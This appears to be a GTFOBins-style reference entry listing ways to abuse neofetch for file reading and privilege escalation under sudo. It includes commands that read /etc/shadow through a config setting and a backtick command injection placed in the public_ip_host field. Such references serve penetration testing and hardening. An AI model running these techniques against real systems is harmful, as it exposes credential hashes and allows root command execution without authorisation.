---
description: The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        neofetch --ascii $LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo neofetch --ascii $LFILE
    - description: read file if `env_keep+=XDG_CONFIG_HOME` in `sudo -l`.
      code: |
        export XDG_CONFIG_HOME="/home/thomas/.config"
        # edit /home/thomas/.cofig/neofetch/config.conf
        # image_source="/etc/shadow"
        sudo /usr/bin/neofetch
    - description: exec cmd if `env_keep+=XDG_CONFIG_HOME` in `sudo -l`.
      code: |
        export XDG_CONFIG_HOME="/home/thomas/.config"
        # edit /home/thomas/.cofig/neofetch/config.conf
        # public_ip_host="http://127.0.0.1/`id`"
        sudo /usr/bin/neofetch
---
